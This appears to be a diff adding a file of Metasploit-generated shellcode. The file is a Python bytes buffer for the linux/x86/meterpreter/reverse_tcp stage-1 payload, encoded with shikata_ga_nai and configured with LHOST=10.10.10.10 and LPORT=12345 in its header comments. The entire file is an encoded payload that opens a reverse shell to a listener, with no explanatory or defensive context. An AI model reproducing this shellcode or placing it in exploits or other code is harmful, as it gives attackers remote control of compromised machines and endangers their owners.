@@ -1,0 +1,33 @@
+# linux/x86/meterpreter/reverse_tcp - 150 bytes (stage 1)
+# https://metasploit.com/
+# Encoder: x86/shikata_ga_nai
+# VERBOSE=false, LHOST=10.10.10.10, LPORT=12345, 
+# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
+# StagerRetryCount=10, StagerRetryWait=5, AutoLoadStdapi=true, 
+# AutoVerifySession=true, AutoVerifySessionTimeout=30, 
+# InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
+# EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
+# SessionRetryWait=10, SessionExpirationTimeout=604800, 
+# SessionCommunicationTimeout=300, PayloadProcessCommandLine=, 
+# AutoUnhookProcess=false, PingbackRetries=0, 
+# PingbackSleep=30, PayloadUUIDTracking=false, 
+# EnableStageEncoding=false, StageEncoderSaveRegisters=, 
+# StageEncodingFallback=true, PrependFork=false, 
+# PrependSetresuid=false, PrependSetreuid=false, 
+# PrependSetuid=false, PrependSetresgid=false, 
+# PrependSetregid=false, PrependSetgid=false, 
+# PrependChrootBreak=false, AppendExit=false, 
+# MeterpreterDebugLevel=0, RemoteMeterpreterDebugFile=
+buf =  b""
+buf += b"\xda\xd4\xbf\xe7\x65\x06\xcf\xd9\x74\x24\xf4\x58\x2b"
+buf += b"\xc9\xb1\x1f\x31\x78\x1a\x03\x78\x1a\x83\xe8\xfc\xe2"
+buf += b"\x12\x0f\x0c\x91\xed\x0b\xe7\xce\x5e\xef\x5b\x7b\x62"
+buf += b"\x5f\x3d\xf2\x83\x52\x42\x93\x18\x05\x49\x96\x94\xdf"
+buf += b"\x25\xa4\xa8\xef\x8c\x21\x49\x65\x89\x69\xd9\x2b\x02"
+buf += b"\x03\x38\x88\x61\x93\x3f\xcf\x03\x8d\x71\xa4\xce\xc5"
+buf += b"\x2f\x44\x31\x16\x77\x2f\x31\x7c\x82\x26\xd2\xb1\x45"
+buf += b"\xf5\x95\x37\x95\x7f\x2b\xdc\x32\x32\x54\x9a\x3c\x22"
+buf += b"\x5b\xdc\xb5\xa1\x9a\x37\xc9\xe4\xfe\xc4\x61\x9b\xcd"
+buf += b"\x55\x04\xa4\xb6\x45\x5d\xac\xa6\xff\xd3\xc4\x98\x03"
+buf += b"\xde\x99\x5c\xc3\x98\x9b\xa1\x25\xe0\x9d\x5d\xa6\x10"
+buf += b"\x25\x5c\xa6\x10\x59\x92\x26"
